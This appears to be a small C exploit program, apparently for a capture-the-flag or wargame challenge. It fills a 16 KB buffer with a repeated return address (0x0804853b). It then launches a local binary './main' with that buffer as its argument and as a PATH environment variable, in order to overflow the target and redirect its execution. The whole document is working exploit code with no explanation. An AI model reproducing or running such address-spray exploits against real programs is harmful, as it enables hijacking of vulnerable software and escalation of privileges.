#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main(void)
{
	char buffer[1 << 14];
	/* 0804853b */
	char spray[] = {0x3b, 0x85, 0x04, 0x08};
	size_t i;

	char *args[] = {"./main", buffer, NULL};
	char *envs[] = {buffer, NULL};

	i = 0;
	buffer[i++] = 'P';
	buffer[i++] = 'A';
	buffer[i++] = 'T';
	buffer[i++] = 'H';
	buffer[i++] = '=';

	for(i = i; i < sizeof(buffer) - 1; i++)
		buffer[i] = spray[i % 4];

	buffer[sizeof(buffer) - 1] = 0;

	execve(args[0], args, envs);
}
